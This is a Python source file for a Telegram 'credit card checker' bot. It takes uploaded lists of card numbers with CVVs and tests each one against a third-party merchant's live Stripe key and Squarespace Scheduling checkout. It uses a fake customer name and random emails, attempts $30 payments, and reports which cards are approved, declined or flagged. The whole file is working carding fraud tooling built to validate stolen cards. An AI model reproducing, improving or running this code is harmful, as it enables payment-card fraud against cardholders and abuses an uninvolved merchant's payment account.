import requests
import time
import json
import uuid
import random
import string
import urllib3
from telebot import types

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

approved = []
declined = []
risk = []

def process_nonsk2_command(bot, message):
    bot.send_message(message.chat.id, "Please send your txt file with CC data.")

def handle_docs(bot, message):
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        with open('cc_data.txt', 'wb') as new_file:
            new_file.write(downloaded_file)

        with open('cc_data.txt', 'r') as file:
            cc_list = file.readlines()

        total_cards = len(cc_list)
        start_time = time.time()

        # Creating inline keyboard for showing results
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            types.InlineKeyboardButton(text="Approved ✅", callback_data='approved'),
            types.InlineKeyboardButton(text="Declined ❌", callback_data='declined'),
            types.InlineKeyboardButton(text="RISK 📝", callback_data='risk')
        )

        initial_message = (
            f"↯ NONSK2 CHECKER\n\n"
            f"CARD CHECKING:\n"
            f"• Approved ✅: [0] •\n"
            f"• Declined ❌: [0] •\n"
            f"• RISK 📝: [0] •\n"
            f"• TOTAL: [{total_cards}] •\n"
            f"－－－－－－－－－－－－－－－－\n"
            f"⚫️ Total CC - {total_cards}\n"
            f"⏱️ Time Taken - 0.00 seconds\n"
            f"▫️ Checked by: {message.from_user.username}\n"
            f"⚡️ Bot by - AFTAB 👑\n"
            f"－－－－－－－－－－－－－－－－"
        )

        msg = bot.send_message(message.chat.id, initial_message, reply_markup=keyboard)

        for cc in cc_list:
            result = check_nonsk2_card(cc.strip())
            if "Approved" in result:
                approved.append((cc.strip(), result))
            elif "Declined" in result:
                declined.append((cc.strip(), result))
            elif "RISK" in result:
                risk.append((cc.strip(), result))

            current_message = (
                f"↯ NONSK2 CHECKER\n\n"
                f"CARD CHECKING:\n{cc.strip()}\n\n"
                f"• Approved ✅: [{len(approved)}] •\n"
                f"• Declined ❌: [{len(declined)}] •\n"
                f"• RISK 📝: [{len(risk)}] •\n"
                f"• TOTAL: [{total_cards}] •\n"
                f"－－－－－－－－－－－－－－－－\n"
                f"⚫️ Total CC - {total_cards}\n"
                f"⏱️ Time Taken - {time.time() - start_time:.2f} seconds\n"
                f"▫️ Checked by: {message.from_user.username}\n"
                f"⚡️ Bot by - AFTAB 👑\n"
                f"－－－－－－－－－－－－－－－－"
            )
            bot.edit_message_text(current_message, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)

    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

def handle_callback_query(call, bot):
    if call.data == 'approved':
        send_cards(call.message.chat.id, approved, bot, "Approved ✅ Cards")
    elif call.data == 'declined':
        send_cards(call.message.chat.id, declined, bot, "Declined ❌ Cards")
    elif call.data == 'risk':
        send_cards(call.message.chat.id, risk, bot, "RISK 📝 Cards")

def send_cards(chat_id, cards, bot, title):
    if cards:
        card_list = "\n".join([f"CC: {cc}\nResult => {result}" for cc, result in cards])
        bot.send_message(chat_id, f"{title}\n\n{card_list}")
    else:
        bot.send_message(chat_id, f"No {title} found.")

def check_nonsk2_card(cc):
    try:
        cc_number, exp_month, exp_year, cvv = cc.split('|')
    except ValueError:
        return "Invalid CC format❌"

    session = requests.Session()
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"

    headers = {
        "User-Agent": user_agent,
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    # Step 1: Get PHPSESSID
    session.get("https://app.squarespacescheduling.com/schedule.php?owner=21346949&calendarID=4717062", headers=headers)
    phpsessid = session.cookies.get('PHPSESSID')

    # Step 2: Create Payment Method
    payment_method_data = {
        "type": "card",
        "billing_details[name]": "Jame Mong",
        "billing_details[email]": f"jamede{random_string()}@gmail.com",
        "billing_details[address][postal_code]": "10080",
        "card[number]": cc_number,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "guid": generate_guid(),
        "muid": generate_guid(),
        "sid": generate_guid(),
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/04dac047e0; stripe-js-v3/04dac047e0; card-element",
        "time_on_page": "193418",
        "key": "pk_live_Y1CqsAphMF6hE2OORZmZSBYl",
        "_stripe_account": "acct_1Hr4hzAnMU46zgL6"
    }

    response = session.post("https://api.stripe.com/v1/payment_methods", data=payment_method_data, headers=headers)
    response_data = response.json()
    payment_method_id = response_data.get('id')

    if not payment_method_id:
        return "Failed to create payment method❌"

    # Step 3: Get Payment Intent
    payment_intent_data = {
        "amount": "30",
        "clientDetails[name]": "Jame Mong",
        "clientDetails[address_zip]": "10080",
        "clientDetails[email]": f"jamede{random_string()}@gmail.com",
        "description": "1112891149 - Jame Mong - Standard Studio A Rental - September 7, 2023 4:00pm",
        "pm": payment_method_id
    }

    response = session.post(f"https://app.squarespacescheduling.com/schedule.php?action=getIntent&owner=21204314&PHPSESSID={phpsessid}", data=payment_intent_data, headers=headers)
    response_data = response.json()
    payment_intent_id = response_data.get('intent')
    client_secret = response_data.get('clientSecret')

    if not payment_intent_id or not client_secret:
        return "Failed to get payment intent❌"

    # Step 4: Confirm Payment Intent
    confirm_payment_data = {
        "payment_method": payment_method_id,
        "expected_payment_method_type": "card",
        "use_stripe_sdk": "true",
        "key": "pk_live_Y1CqsAphMF6hE2OORZmZSBYl",
        "_stripe_account": "acct_1Hr4hzAnMU46zgL6",
        "client_secret": client_secret
    }

    response = session.post(f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm", data=confirm_payment_data, headers=headers)
    response_data = response.json()

    if "succeeded" in response_data.get("status", ""):
        return "30$✅ CCN"
    elif "incorrect_cvc" in response_data.get("error", {}).get("decline_code", ""):
        return "CCN"
    elif "insufficient_funds" in response_data.get("error", {}).get("decline_code", ""):
        return "NSF"
    elif "stolen_card" in response_data.get("error", {}).get("decline_code", ""):
        return "STOLEN"
    elif "three_d_secure_redirect" in response_data.get("error", {}).get("decline_code", ""):
        return "3DSECURE"
    elif "rate_limit" in response_data.get("error", {}).get("decline_code", ""):
        return "RATE LIMIT"
    else:
        return "Declined"

def random_string():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

def generate_guid():
    return str(uuid.uuid4())

def get_footer_info(total_cards, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⚫️ Total CC - {total_cards}\n"
        f"⏱️ Time Taken - {elapsed_time:.2f} seconds\n"
        f"▫️ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB 👑\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
